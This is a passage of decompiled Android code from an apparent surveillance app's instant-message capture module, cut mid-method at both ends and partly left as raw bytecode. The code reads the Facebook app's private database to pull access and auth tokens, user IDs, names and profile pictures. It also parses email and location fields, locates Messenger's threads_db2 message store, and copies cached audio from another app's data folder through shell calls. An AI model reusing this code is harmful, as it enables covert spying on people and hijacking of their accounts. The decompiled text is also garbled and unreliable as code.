    localb.<init>();
    localb.a(paramString2);
    localb.b(paramString3);
    localb.c(null);
    localb.a(null);
    localb.d(null);
    return localb;
  }
  
  public static com.vvt.im.events.info.d a(String paramString1, String paramString2, SQLiteDatabase paramSQLiteDatabase)
  {
    boolean bool1 = true;
    Object localObject1 = null;
    boolean bool2 = a;
    if (bool2) {}
    com.vvt.im.events.info.d locald = new com/vvt/im/events/info/d;
    locald.<init>();
    byte[] arrayOfByte1 = new byte[0];
    Object localObject2;
    Object localObject4;
    Object localObject7;
    Object localObject9;
    Object localObject11;
    JSONObject localJSONObject;
    Object localObject12;
    boolean bool5;
    boolean bool6;
    boolean bool7;
    if (paramSQLiteDatabase != null)
    {
      localObject2 = new java/lang/StringBuilder;
      ((StringBuilder)localObject2).<init>();
      ((StringBuilder)localObject2).append("key").append(" = ?");
      ((StringBuilder)localObject2).append(" OR ");
      ((StringBuilder)localObject2).append("key").append(" = ?");
      ((StringBuilder)localObject2).append(" OR ");
      ((StringBuilder)localObject2).append("key").append(" = ?");
      ((StringBuilder)localObject2).append(" OR ");
      ((StringBuilder)localObject2).append("key").append(" = ?");
      localObject4 = "preferences";
      localObject7 = d;
      localObject9 = ((StringBuilder)localObject2).toString();
      localObject11 = new String[4];
      localObject11[0] = "/auth/user_data/fb_me_user";
      localObject11[bool1] = "/auth/user_data/fb_uid";
      localObject11[2] = "/fbns/token_owner";
      int i = 3;
      localObject11[i] = "/fb_android/uvm/active_session_info";
      localObject2 = paramSQLiteDatabase;
      localJSONObject = null;
      localObject12 = paramSQLiteDatabase.query((String)localObject4, (String[])localObject7, (String)localObject9, (String[])localObject11, null, null, null);
      if (localObject12 != null)
      {
        boolean bool3 = ((Cursor)localObject12).moveToFirst();
        if (bool3)
        {
          localObject2 = "value";
          for (;;)
          {
            try
            {
              int j = ((Cursor)localObject12).getColumnIndex((String)localObject2);
              localObject2 = ((Cursor)localObject12).getString(j);
            }
            catch (JSONException localJSONException1)
            {
              Object localObject13;
              localJSONException1 = localJSONException1;
              bool4 = false;
              arrayOfByte2 = null;
              bool5 = false;
              localObject4 = null;
              bool6 = false;
              localObject7 = null;
              if (localObject12 != null) {
                ((Cursor)localObject12).close();
              }
              localObject9 = localObject4;
              localObject4 = localObject7;
              localObject7 = arrayOfByte2;
              arrayOfByte2 = arrayOfByte1;
              continue;
            }
            catch (Exception localException)
            {
              bool4 = c;
              if ((bool4) && (localObject12 == null)) {
                continue;
              }
              ((Cursor)localObject12).close();
              continue;
            }
            finally
            {
              if (localObject12 != null) {
                ((Cursor)localObject12).close();
              }
            }
            try
            {
              bool5 = a;
              if (bool5) {}
              localJSONObject = new org/json/JSONObject;
              localJSONObject.<init>((String)localObject2);
              localObject4 = "com.facebook.katana";
              bool5 = paramString2.equals(localObject4);
              if (!bool5) {
                continue;
              }
              bool5 = bool1;
              if (!bool5) {
                continue;
              }
              bool5 = a;
              if (bool5) {}
              localObject4 = "access_token";
              bool5 = localJSONObject.has((String)localObject4);
              if (!bool5) {
                break label1261;
              }
              localObject4 = "access_token";
              localObject4 = localJSONObject.getString((String)localObject4);
            }
            catch (JSONException localJSONException2)
            {
              bool5 = false;
              localObject5 = null;
              bool6 = false;
              localObject7 = null;
              continue;
              bool5 = false;
              localObject6 = null;
            }
          }
          localObject7 = "auth_token";
          try
          {
            bool6 = localJSONObject.has((String)localObject7);
            if (bool6)
            {
              localObject7 = "auth_token";
              localObject4 = localJSONObject.getString((String)localObject7);
            }
            localObject7 = "profile";
            bool6 = localJSONObject.has((String)localObject7);
            if (!bool6) {
              break label791;
            }
            bool6 = a;
            if (bool6) {}
            localObject7 = "profile";
            localObject7 = localJSONObject.getJSONObject((String)localObject7);
            localObject9 = "name";
            bool6 = ((JSONObject)localObject7).has((String)localObject9);
            if (!bool6) {
              break label1252;
            }
            localObject7 = "profile";
            localObject7 = localJSONObject.getJSONObject((String)localObject7);
            localObject9 = "name";
            localObject7 = ((JSONObject)localObject7).getString((String)localObject9);
          }
          catch (JSONException localJSONException4)
          {
            for (;;)
            {
              bool6 = false;
              localObject8 = null;
              continue;
              bool6 = false;
              localObject8 = null;
            }
          }
          localObject9 = "profile";
          try
          {
            localObject9 = localJSONObject.getJSONObject((String)localObject9);
            localObject11 = "pic_square";
            bool7 = ((JSONObject)localObject9).has((String)localObject11);
            if (!bool7) {
              break label1234;
            }
            localObject9 = "profile";
            localObject9 = localJSONObject.getJSONObject((String)localObject9);
            localObject11 = "pic_square";
            localObject9 = ((JSONObject)localObject9).getString((String)localObject11);
            localObject11 = localObject9;
          }
          catch (JSONException localJSONException5)
          {
            for (;;)
            {
              label503:
              continue;
              bool4 = false;
              arrayOfByte3 = null;
              continue;
              bool5 = false;
              localObject6 = null;
              continue;
              k = 0;
              localObject11 = null;
              continue;
              bool7 = false;
              localObject10 = null;
              continue;
              bool6 = false;
              localObject8 = null;
              continue;
              bool7 = false;
              localObject10 = null;
              continue;
              k = 0;
              localObject11 = null;
              continue;
              bool6 = false;
              localObject8 = null;
            }
          }
          localObject9 = "uid";
          bool7 = localJSONObject.has((String)localObject9);
          if (bool7)
          {
            localObject9 = "uid";
            localObject9 = localJSONObject.getString((String)localObject9);
            localObject2 = g((String)localObject11);
            localObject13 = localObject9;
            localObject9 = localObject7;
            localObject7 = localObject4;
            localObject4 = localObject13;
            if (localObject12 != null) {
              ((Cursor)localObject12).close();
            }
            localObject13 = localObject4;
            localObject4 = localObject9;
            localObject9 = localObject7;
            localObject7 = localObject13;
          }
        }
      }
    }
    for (;;)
    {
      int k;
      boolean bool4;
      if (localObject2 != null)
      {
        k = localObject2.length;
        if (k > 0)
        {
          localObject11 = ImType.FACEBOOK;
          localObject12 = ImMediaFileType.OWNER_PROFILE;
          localObject11 = com.vvt.im.a.c.a(paramString1, (ImType)localObject11, (ImMediaFileType)localObject12);
          localObject12 = com.vvt.im.a.c.a(ImMediaFileType.OWNER_PROFILE);
          localObject2 = com.vvt.io.d.a((byte[])localObject2, (String)localObject11, (String)localObject12);
          locald.d(null);
          if (localObject4 == null) {
            localObject4 = "owner";
          }
          locald.a((String)localObject4);
          if (localObject7 == null) {}
          label791:
          byte[] arrayOfByte2;
          for (localObject4 = "-1";; localObject4 = localObject7)
          {
            locald.b((String)localObject4);
            locald.c(null);
            locald.f((String)localObject2);
            locald.a(null);
            locald.e((String)localObject9);
            bool4 = a;
            if (bool4) {}
            bool4 = a;
            if (bool4) {}
            bool4 = a;
            if (bool4) {}
            bool4 = a;
            if (bool4) {}
            bool4 = a;
            if (bool4) {}
            bool4 = a;
            if (bool4) {}
            bool4 = a;
            if (bool4) {}
            localObject1 = locald;
            return (com.vvt.im.events.info.d)localObject1;
            bool5 = false;
            localObject4 = null;
            break;
            bool6 = a;
            if (bool6) {}
            localObject7 = "name";
            bool6 = localJSONObject.has((String)localObject7);
            if (!bool6) {
              break label1243;
            }
            localObject7 = "name";
            localObject7 = localJSONObject.getString((String)localObject7);
            localObject9 = "pic_square";
            bool7 = localJSONObject.has((String)localObject9);
            if (!bool7) {
              break label1234;
            }
            localObject9 = "pic_square";
            localObject9 = localJSONObject.getString((String)localObject9);
            localObject11 = localObject9;
            break label503;
            bool5 = a;
            if (bool5) {}
            localObject4 = "name";
            bool5 = localJSONObject.has((String)localObject4);
            if (!bool5) {
              break label1216;
            }
            localObject4 = "name";
            localObject7 = localJSONObject.getString((String)localObject4);
            localObject4 = "uid";
          }
        }
      }
      Object localObject5;
      label1216:
      label1234:
      label1243:
      label1252:
      label1261:
      byte[] arrayOfByte3 = arrayOfByte1;
      bool6 = false;
      Object localObject8 = null;
      bool7 = false;
      Object localObject10 = null;
      bool5 = false;
      Object localObject6 = null;
    }
  }
  
  private static f a(SQLiteDatabase paramSQLiteDatabase, String paramString1, String paramString2, String paramString3)
  {
    bool1 = a;
    if (bool1) {}
    f localf = new com/vvt/im/events/info/f;
    localf.<init>();
    long l1 = -1;
    str1 = null;
    for (;;)
    {
      label140:
      Object localObject2;
      try
      {
        localObject1 = new org/json/JSONObject;
        ((JSONObject)localObject1).<init>(paramString2);
        str2 = "name";
        str2 = ((JSONObject)localObject1).getString(str2);
        str3 = "user_key";
        str3 = ((JSONObject)localObject1).getString(str3);
        String str4 = "email";
        boolean bool2 = ((JSONObject)localObject1).has(str4);
        if (bool2)
        {
          str4 = "email";
          str1 = ((JSONObject)localObject1).getString(str4);
        }
      }
      catch (Exception localException2)
      {
        Object localObject1;
        String str3;
        boolean bool3;
        int i;
        String str5;
        com.vvt.im.events.info.c localc1;
        double d1;
        double d2;
        float f1;
        float f2;
        Object localObject3;
        String str7;
        boolean bool4;
        bool1 = false;
        localObject2 = null;
        boolean bool5 = c;
        if (bool5) {}
        String str2 = "UNKNOWN";
        long l2 = -1;
        continue;
      }
      try
      {
        bool3 = b;
        if (bool3) {}
        localObject1 = ":";
      }
      catch (Exception localException3)
      {
        boolean bool6;
        com.vvt.im.events.info.c localc2;
        String str6 = str1;
      }
    }
    try
    {
      i = str3.indexOf((String)localObject1) + 1;
      localObject1 = str3.substring(i);
      l1 = Long.parseLong((String)localObject1);
    }
    catch (Exception localException1)
    {
      break label140;
    }
    l2 = l1;
    str5 = str1;
    localc1 = new com/vvt/im/events/info/c;
    localc1.<init>();
    if (paramString3 != null)
    {
      d1 = 0.0D;
      d2 = 0.0D;
      i = -1082130432;
      f1 = -1.0F;
      f2 = -1.0F;
    }
    try
    {
      localObject3 = new org/json/JSONObject;
      ((JSONObject)localObject3).<init>(paramString3);
      str7 = "latitude";
      str7 = ((JSONObject)localObject3).getString(str7);
      d1 = Double.parseDouble(str7);
      str7 = "longitude";
      str7 = ((JSONObject)localObject3).getString(str7);
      d2 = Double.parseDouble(str7);
      str7 = "accuracy";
      localObject3 = ((JSONObject)localObject3).getString(str7);
      f1 = Float.parseFloat((String)localObject3);
      bool4 = b;
      if (!bool4) {}
    }
    catch (Exception localException4)
    {
      for (;;)
      {
        bool6 = c;
        if (bool6) {}
        localc2 = new com/vvt/im/events/info/c;
        localc2.<init>();
        continue;
        bool1 = false;
        localObject2 = null;
      }
    }
    localc1.a(d1);
    localc1.b(d2);
    localc1.b(f1);
    localc1.a(f2);
    if (0 == 0)
    {
      localf.d(str5);
      localf.b(str2);
      localf.e(null);
      localf.a(null);
      str5 = Long.toString(l2);
      localf.a(str5);
      localf.a(localc1);
      bool1 = a;
      if (bool1) {}
      return localf;
    }
  }
  
  /* Error */
  private static String a(SQLiteDatabase paramSQLiteDatabase, boolean paramBoolean)
  {
    // Byte code:
    //   0: aconst_null
    //   1: astore_2
    //   2: ldc_w 338
    //   5: astore_3
    //   6: iconst_0
    //   7: istore 4
    //   9: new 168	java/lang/StringBuilder
    //   12: astore 5
    //   14: aload 5
    //   16: invokespecial 169	java/lang/StringBuilder:<init>	()V
    //   19: aload 5
    //   21: ldc_w 340
    //   24: invokevirtual 173	java/lang/StringBuilder:append	(Ljava/lang/String;)Ljava/lang/StringBuilder;
    //   27: pop
    //   28: aload 5
    //   30: ldc_w 342
    //   33: invokevirtual 173	java/lang/StringBuilder:append	(Ljava/lang/String;)Ljava/lang/StringBuilder;
    //   36: pop
    //   37: aload 5
    //   39: ldc_w 344
    //   42: invokevirtual 173	java/lang/StringBuilder:append	(Ljava/lang/String;)Ljava/lang/StringBuilder;
    //   45: pop
    //   46: aload 5
    //   48: ldc_w 346
    //   51: invokevirtual 173	java/lang/StringBuilder:append	(Ljava/lang/String;)Ljava/lang/StringBuilder;
    //   54: pop
    //   55: aload 5
    //   57: ldc_w 348
    //   60: invokevirtual 173	java/lang/StringBuilder:append	(Ljava/lang/String;)Ljava/lang/StringBuilder;
    //   63: pop
    //   64: aload 5
    //   66: ldc_w 350
    //   69: invokevirtual 173	java/lang/StringBuilder:append	(Ljava/lang/String;)Ljava/lang/StringBuilder;
    //   72: pop
    //   73: ldc_w 352
    //   76: astore 6
    //   78: aload 5
    //   80: aload 6
    //   82: invokevirtual 173	java/lang/StringBuilder:append	(Ljava/lang/String;)Ljava/lang/StringBuilder;
    //   85: pop
    //   86: iload_1
    //   87: ifeq +16 -> 103
    //   90: ldc_w 354
    //   93: astore 6
    //   95: aload 5
    //   97: aload 6
    //   99: invokevirtual 173	java/lang/StringBuilder:append	(Ljava/lang/String;)Ljava/lang/StringBuilder;
    //   102: pop
    //   103: aload 5
    //   105: ldc_w 356
    //   108: invokevirtual 173	java/lang/StringBuilder:append	(Ljava/lang/String;)Ljava/lang/StringBuilder;
    //   111: pop
    //   112: aload 5
    //   114: ldc_w 358
    //   117: invokevirtual 173	java/lang/StringBuilder:append	(Ljava/lang/String;)Ljava/lang/StringBuilder;
    //   120: pop
    //   121: aload 5
    //   123: ldc_w 360
    //   126: invokevirtual 173	java/lang/StringBuilder:append	(Ljava/lang/String;)Ljava/lang/StringBuilder;
    //   129: pop
    //   130: aload 5
    //   132: ldc_w 362
    //   135: invokevirtual 173	java/lang/StringBuilder:append	(Ljava/lang/String;)Ljava/lang/StringBuilder;
    //   138: pop
    //   139: aload 5
    //   141: ldc_w 364
    //   144: invokevirtual 173	java/lang/StringBuilder:append	(Ljava/lang/String;)Ljava/lang/StringBuilder;
    //   147: pop
    //   148: aload 5
    //   150: ldc_w 366
    //   153: invokevirtual 173	java/lang/StringBuilder:append	(Ljava/lang/String;)Ljava/lang/StringBuilder;
    //   156: pop
    //   157: ldc_w 368
    //   160: astore 7
    //   162: iconst_0
    //   163: istore 8
    //   165: aconst_null
    //   166: astore 9
    //   168: ldc_w 370
    //   171: astore 10
    //   173: aload_0
    //   174: astore 6
    //   176: aload_0
    //   177: aload 7
    //   179: aconst_null
    //   180: aconst_null
    //   181: aconst_null
    //   182: aconst_null
    //   183: aconst_null
    //   184: aconst_null
    //   185: aload 10
    //   187: invokevirtual 373	android/database/sqlite/SQLiteDatabase:query	(Ljava/lang/String;[Ljava/lang/String;Ljava/lang/String;[Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;)Landroid/database/Cursor;
    //   190: astore_2
    //   191: aload_2
    //   192: ifnull +519 -> 711
    //   195: ldc_w 375
    //   198: astore 6
    //   200: aload_2
    //   201: aload 6
    //   203: invokeinterface 82 2 0
    //   208: istore 11
    //   210: iload 11
    //   212: iflt +16 -> 228
    //   215: ldc_w 377
    //   218: astore 6
    //   220: aload 5
    //   222: aload 6
    //   224: invokevirtual 173	java/lang/StringBuilder:append	(Ljava/lang/String;)Ljava/lang/StringBuilder;
    //   227: pop
    //   228: ldc_w 379
    //   231: astore 6
    //   233: aload_2
    //   234: aload 6
    //   236: invokeinterface 82 2 0
    //   241: istore 11
    //   243: iload 11
    //   245: iflt +307 -> 552
    //   248: ldc_w 381
    //   251: astore 6
    //   253: aload 5
    //   255: aload 6
    //   257: invokevirtual 173	java/lang/StringBuilder:append	(Ljava/lang/String;)Ljava/lang/StringBuilder;
    //   260: pop
    //   261: ldc_w 379
    //   264: astore_3
    //   265: aload_2
    //   266: ifnull +9 -> 275
    //   269: aload_2
    //   270: invokeinterface 112 1 0
    //   275: ldc_w 383
    //   278: astore 7
    //   280: iconst_0
    //   281: istore 8
    //   283: aconst_null
    //   284: astore 9
    //   286: ldc_w 370
    //   289: astore 10
    //   291: aload_0
    //   292: astore 6
    //   294: aload_0
    //   295: aload 7
    //   297: aconst_null
    //   298: aconst_null
    //   299: aconst_null
    //   300: aconst_null
    //   301: aconst_null
    //   302: aconst_null
    //   303: aload 10
    //   305: invokevirtual 373	android/database/sqlite/SQLiteDatabase:query	(Ljava/lang/String;[Ljava/lang/String;Ljava/lang/String;[Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;)Landroid/database/Cursor;
    //   308: astore 6
    //   310: ldc_w 385
    //   313: astore 7
    //   315: aload 6
    //   317: aload 7
    //   319: invokeinterface 82 2 0
    //   324: istore 12
    //   326: iload 12
    //   328: iflt +368 -> 696
    //   331: ldc_w 387
    //   334: astore 7
    //   336: aload 5
    //   338: aload 7
    //   340: invokevirtual 173	java/lang/StringBuilder:append	(Ljava/lang/String;)Ljava/lang/StringBuilder;
    //   343: pop
    //   344: iconst_1
    //   345: istore 4
    //   347: aload 6
    //   349: astore_2
    //   350: aload_3
    //   351: astore 7
    //   353: iload 4
    //   355: istore 11
    //   357: aload_2
    //   358: ifnull +9 -> 367
    //   361: aload_2
    //   362: invokeinterface 112 1 0
    //   367: aload 5
    //   369: ldc_w 389
    //   372: invokevirtual 173	java/lang/StringBuilder:append	(Ljava/lang/String;)Ljava/lang/StringBuilder;
    //   375: pop
    //   376: aload 5
    //   378: ldc_w 391
    //   381: invokevirtual 173	java/lang/StringBuilder:append	(Ljava/lang/String;)Ljava/lang/StringBuilder;
    //   384: pop
    //   385: aload 5
    //   387: ldc_w 393
    //   390: invokevirtual 173	java/lang/StringBuilder:append	(Ljava/lang/String;)Ljava/lang/StringBuilder;
    //   393: aload 7
    //   395: invokevirtual 173	java/lang/StringBuilder:append	(Ljava/lang/String;)Ljava/lang/StringBuilder;
    //   398: pop
    //   399: ldc_w 395
    //   402: astore 9
    //   404: aload 5
    //   406: aload 9
    //   408: invokevirtual 173	java/lang/StringBuilder:append	(Ljava/lang/String;)Ljava/lang/StringBuilder;
    //   411: pop
    //   412: iload_1
    //   413: ifeq +16 -> 429
    //   416: ldc_w 397
    //   419: astore 9
    //   421: aload 5
    //   423: aload 9
    //   425: invokevirtual 173	java/lang/StringBuilder:append	(Ljava/lang/String;)Ljava/lang/StringBuilder;
    //   428: pop
    //   429: iload 11
    //   431: ifeq +16 -> 447
    //   434: ldc_w 399
    //   437: astore 6
    //   439: aload 5
    //   441: aload 6
    //   443: invokevirtual 173	java/lang/StringBuilder:append	(Ljava/lang/String;)Ljava/lang/StringBuilder;
    //   446: pop
    //   447: aload 5
    //   449: ldc_w 401
    //   452: invokevirtual 173	java/lang/StringBuilder:append	(Ljava/lang/String;)Ljava/lang/StringBuilder;
    //   455: pop
    //   456: aload 5
    //   458: ldc_w 403
    //   461: invokevirtual 173	java/lang/StringBuilder:append	(Ljava/lang/String;)Ljava/lang/StringBuilder;
    //   464: pop
    //   465: aload 5
    //   467: ldc_w 405
    //   470: invokevirtual 173	java/lang/StringBuilder:append	(Ljava/lang/String;)Ljava/lang/StringBuilder;
    //   473: aload 7
    //   475: invokevirtual 173	java/lang/StringBuilder:append	(Ljava/lang/String;)Ljava/lang/StringBuilder;
    //   478: ldc_w 407
    //   481: invokevirtual 173	java/lang/StringBuilder:append	(Ljava/lang/String;)Ljava/lang/StringBuilder;
    //   484: aload 7
    //   486: invokevirtual 173	java/lang/StringBuilder:append	(Ljava/lang/String;)Ljava/lang/StringBuilder;
    //   489: pop
    //   490: aload 5
    //   492: ldc_w 409
    //   495: invokevirtual 173	java/lang/StringBuilder:append	(Ljava/lang/String;)Ljava/lang/StringBuilder;
    //   498: pop
    //   499: aload 5
    //   501: ldc_w 411
    //   504: invokevirtual 173	java/lang/StringBuilder:append	(Ljava/lang/String;)Ljava/lang/StringBuilder;
    //   507: aload 7
    //   509: invokevirtual 173	java/lang/StringBuilder:append	(Ljava/lang/String;)Ljava/lang/StringBuilder;
    //   512: ldc_w 413
    //   515: invokevirtual 173	java/lang/StringBuilder:append	(Ljava/lang/String;)Ljava/lang/StringBuilder;
    //   518: pop
    //   519: aload 5
    //   521: ldc_w 415
    //   524: invokevirtual 173	java/lang/StringBuilder:append	(Ljava/lang/String;)Ljava/lang/StringBuilder;
    //   527: pop
    //   528: aload 5
    //   530: ldc_w 417
    //   533: invokevirtual 173	java/lang/StringBuilder:append	(Ljava/lang/String;)Ljava/lang/StringBuilder;
    //   536: pop
    //   537: aload 5
    //   539: ldc_w 419
    //   542: invokevirtual 173	java/lang/StringBuilder:append	(Ljava/lang/String;)Ljava/lang/StringBuilder;
    //   545: pop
    //   546: aload 5
    //   548: invokevirtual 181	java/lang/StringBuilder:toString	()Ljava/lang/String;
    //   551: areturn
    //   552: ldc_w 421
    //   555: astore 6
    //   557: aload_2
    //   558: aload 6
    //   560: invokeinterface 82 2 0
    //   565: istore 11
    //   567: iload 11
    //   569: iflt -304 -> 265
    //   572: ldc_w 423
    //   575: astore 6
    //   577: aload 5
    //   579: aload 6
    //   581: invokevirtual 173	java/lang/StringBuilder:append	(Ljava/lang/String;)Ljava/lang/StringBuilder;
    //   584: pop
    //   585: ldc_w 421
    //   588: astore_3
    //   589: goto -324 -> 265
    //   592: astore 6
    //   594: iconst_0
    //   595: istore 12
    //   597: aconst_null
    //   598: astore 7
    //   600: aload_3
    //   601: astore 6
    //   603: getstatic 23	com/vvt/capture/removeFromPath/a/a:MyUncaughtExceptionHandler	Z
    //   606: istore 8
    //   608: iload 8
    //   610: ifeq +3 -> 613
    //   613: aload 7
    //   615: ifnull +10 -> 625
    //   618: aload 7
    //   620: invokeinterface 112 1 0
    //   625: aload 6
    //   627: astore 7
    //   629: iconst_0
    //   630: istore 11
    //   632: aconst_null
    //   633: astore 6
    //   635: goto -268 -> 367
    //   638: astore 6
    //   640: aload_2
    //   641: ifnull +9 -> 650
    //   644: aload_2
    //   645: invokeinterface 112 1 0
    //   650: aload 6
    //   652: athrow
    //   653: astore 7
    //   655: aload 6
    //   657: astore_2
    //   658: aload 7
    //   660: astore 6
    //   662: goto -22 -> 640
    //   665: astore 6
    //   667: aload 7
    //   669: astore_2
    //   670: goto -30 -> 640
    //   673: astore 6
    //   675: aload_2
    //   676: astore 7
    //   678: aload_3
    //   679: astore 6
    //   681: goto -78 -> 603
    //   684: astore 7
    //   686: aload 6
    //   688: astore 7
    //   690: aload_3
    //   691: astore 6
    //   693: goto -90 -> 603
    //   696: aload 6
    //   698: astore_2
    //   699: aload_3
    //   700: astore 7
    //   702: iconst_0
    //   703: istore 11
    //   705: aconst_null
    //   706: astore 6
    //   708: goto -351 -> 357
    //   711: iconst_0
    //   712: istore 11
    //   714: aconst_null
    //   715: astore 6
    //   717: aload_3
    //   718: astore 7
    //   720: goto -363 -> 357
    // Local variable table:
    //   start	length	slot	name	signature
    //   0	723	0	paramSQLiteDatabase	SQLiteDatabase
    //   0	723	1	paramBoolean	boolean
    //   1	698	2	localObject1	Object
    //   5	713	3	str1	String
    //   7	347	4	i	int
    //   12	566	5	localStringBuilder	StringBuilder
    //   76	504	6	localObject2	Object
    //   592	1	6	localException1	Exception
    //   601	33	6	str2	String
    //   638	18	6	localObject3	Object
    //   660	1	6	localObject4	Object
    //   665	1	6	localObject5	Object
    //   673	1	6	localException2	Exception
    //   679	37	6	str3	String
    //   160	468	7	str4	String
    //   653	15	7	localObject6	Object
    //   676	1	7	localObject7	Object
    //   684	1	7	localException3	Exception
    //   688	31	7	str5	String
    //   163	446	8	bool	boolean
    //   166	258	9	str6	String
    //   171	133	10	str7	String
    //   208	505	11	j	int
    //   324	272	12	k	int
    // Exception table:
    //   from	to	target	type
    //   185	190	592	java/lang/Exception
    //   185	190	638	finally
    //   201	208	638	finally
    //   222	228	638	finally
    //   234	241	638	finally
    //   255	261	638	finally
    //   269	275	638	finally
    //   303	308	638	finally
    //   558	565	638	finally
    //   579	585	638	finally
    //   317	324	653	finally
    //   338	344	653	finally
    //   603	606	665	finally
    //   201	208	673	java/lang/Exception
    //   222	228	673	java/lang/Exception
    //   234	241	673	java/lang/Exception
    //   255	261	673	java/lang/Exception
    //   269	275	673	java/lang/Exception
    //   303	308	673	java/lang/Exception
    //   558	565	673	java/lang/Exception
    //   579	585	673	java/lang/Exception
    //   317	324	684	java/lang/Exception
    //   338	344	684	java/lang/Exception
  }
  
  /* Error */
  private static String a(SQLiteDatabase paramSQLiteDatabase, String[] paramArrayOfString)
  {
    // Byte code:
    //   0: aconst_null
    //   1: astore_2
    //   2: aload_0
    //   3: ifnull +121 -> 124
    //   6: invokestatic 425	com/vvt/capture/removeFromPath/a/a:FxFileObserverWorker	()Ljava/lang/String;
    //   9: astore_3
    //   10: getstatic 16	com/vvt/capture/removeFromPath/a/a:a	Z
    //   13: istore 4
    //   15: iload 4
    //   17: ifeq +3 -> 20
    //   20: aload_0
    //   21: aload_3
    //   22: aload_1
    //   23: invokevirtual 70	android/database/sqlite/SQLiteDatabase:rawQuery	(Ljava/lang/String;[Ljava/lang/String;)Landroid/database/Cursor;
    //   26: astore_3
    //   27: aload_3
    //   28: invokeinterface 428 1 0
    //   33: istore 4
    //   35: iload 4
    //   37: ifeq +27 -> 64
    //   40: ldc_w 430
    //   43: astore 5
    //   45: aload_3
    //   46: aload 5
    //   48: invokeinterface 82 2 0
    //   53: istore 4
    //   55: aload_3
    //   56: iload 4
    //   58: invokeinterface 85 2 0
    //   63: astore_2
    //   64: aload_3
    //   65: ifnull +9 -> 74
    //   68: aload_3
    //   69: invokeinterface 112 1 0
    //   74: aload_2
    //   75: areturn
    //   76: astore_3
    //   77: aconst_null
    //   78: astore_3
    //   79: getstatic 23	com/vvt/capture/removeFromPath/a/a:MyUncaughtExceptionHandler	Z
    //   82: istore 4
    //   84: iload 4
    //   86: ifeq +3 -> 89
    //   89: aload_3
    //   90: ifnull -16 -> 74
    //   93: goto -25 -> 68
    //   96: astore 6
    //   98: aconst_null
    //   99: astore_3
    //   100: aload 6
    //   102: astore_2
    //   103: aload_3
    //   104: ifnull +9 -> 113
    //   107: aload_3
    //   108: invokeinterface 112 1 0
    //   113: aload_2
    //   114: athrow
    //   115: astore_2
    //   116: goto -13 -> 103
    //   119: astore 5
    //   121: goto -42 -> 79
    //   124: aconst_null
    //   125: astore_3
    //   126: goto -62 -> 64
    // Local variable table:
    //   start	length	slot	name	signature
    //   0	129	0	paramSQLiteDatabase	SQLiteDatabase
    //   0	129	1	paramArrayOfString	String[]
    //   1	113	2	localObject1	Object
    //   115	1	2	localObject2	Object
    //   9	60	3	localObject3	Object
    //   76	1	3	localException1	Exception
    //   78	48	3	localObject4	Object
    //   13	23	4	bool1	boolean
    //   53	4	4	i	int
    //   82	3	4	bool2	boolean
    //   43	4	5	str	String
    //   119	1	5	localException2	Exception
    //   96	5	6	localObject5	Object
    // Exception table:
    //   from	to	target	type
    //   6	9	76	java/lang/Exception
    //   10	13	76	java/lang/Exception
    //   22	26	76	java/lang/Exception
    //   6	9	96	finally
    //   10	13	96	finally
    //   22	26	96	finally
    //   27	33	115	finally
    //   46	53	115	finally
    //   56	63	115	finally
    //   79	82	115	finally
    //   27	33	119	java/lang/Exception
    //   46	53	119	java/lang/Exception
    //   56	63	119	java/lang/Exception
  }
  
  public static String a(String paramString)
  {
    boolean bool1 = a;
    if (bool1) {}
    bool1 = false;
    Object localObject1 = null;
    String str1 = com.vvt.n.a.a(paramString);
    if (str1 != null)
    {
      File localFile = new java/io/File;
      Object localObject2 = new java/lang/StringBuilder;
      ((StringBuilder)localObject2).<init>();
      localObject2 = ((StringBuilder)localObject2).append(str1).append("/");
      String str2 = "threads_db2";
      localObject2 = str2;
      localFile.<init>((String)localObject2);
      boolean bool2 = localFile.exists();
      if (bool2)
      {
        localObject1 = new java/lang/StringBuilder;
        ((StringBuilder)localObject1).<init>();
        localObject1 = ((StringBuilder)localObject1).append(str1).append("/");
        str1 = "threads_db2";
        localObject1 = str1;
      }
    }
    boolean bool3 = b;
    if (bool3) {}
    bool3 = a;
    if (bool3) {}
    return (String)localObject1;
  }
  
  private static String a(String paramString1, String paramString2, int paramInt, String paramString3)
  {
    bool1 = a;
    if (bool1) {}
    Object localObject1 = null;
    Object localObject2;
    if (paramInt > 0)
    {
      bool1 = false;
      localObject2 = null;
    }
    try
    {
      String str1 = a(paramString1, false);
      localObject2 = "/data/data/%s/cache/audio";
      boolean bool2 = true;
      Object localObject4 = new Object[bool2];
      boolean bool3 = false;
      String str2 = null;
      localObject4[0] = paramString2;
      localObject2 = String.format((String)localObject2, (Object[])localObject4);
      bool2 = ShellUtil.b((String)localObject2);
      if (!bool2) {
        break label266;
      }
      bool2 = a;
      if (bool2) {}
      long l = 3000L;
      SystemClock.sleep(l);
      localObject2 = f((String)localObject2);
      localObject4 = ((List)localObject2).iterator();
      int i;
      do
      {
        do
        {
          bool1 = ((Iterator)localObject4).hasNext();
          if (!bool1) {
            break;
          }
          localObject2 = ((Iterator)localObject4).next();
          localObject2 = (com.vvt.io.c)localObject2;
          str2 = ((com.vvt.io.c)localObject2).b;
          String str3 = "lru";
          bool3 = str2.endsWith(str3);
        } while (bool3);
        str2 = ((com.vvt.io.c)localObject2).e;
        i = Integer.parseInt(str2);
      } while (i != paramInt);
      localObject4 = ((com.vvt.io.c)localObject2).a;
      localObject2 = ((com.vvt.io.c)localObject2).b;
      localObject2 = p.a((String)localObject4, (String)localObject2);
      bool2 = a;
      if (bool2) {}
      ShellUtil.a((String)localObject2, str1);
      ShellUtil.b(paramString3, str1);
      localObject2 = str1;
    }
    catch (Exception localException)
    {
      for (;;)
      {
        label266:
        bool1 = c;
        if (bool1)
        {
          continue;
          bool1 = false;
          Object localObject3 = null;
        }
      }
    }
    localObject1 = localObject2;
    for (;;)
    {
      bool1 = a;
      if (bool1) {}
      bool1 = a;
      if (bool1) {}
      return (String)localObject1;
      bool1 = a;
      if (!bool1) {}
    }
  }
  
  /* Error */
  private static String a(String paramString1, String paramString2, String paramString3)
  {
    // Byte code:
    //   0: aconst_null
    //   1: astore_3
    //   2: iconst_0
    //   3: istore 4
    //   5: aconst_null
    //   6: astore 5
    //   8: getstatic 16	com/vvt/capture/removeFromPath/a/a:a	Z
    //   11: istore 6
    //   13: iload 6
    //   15: ifeq +3 -> 18
    //   18: iconst_1
    //   19: istore 7
    //   21: iload 7
    //   23: anewarray 4	java/lang/Object
    //   26: astore 8
    //   28: aload 8
    //   30: iconst_0
    //   31: aload_0
    //   32: aastore
    //   33: ldc_w 511
    //   36: aload 8
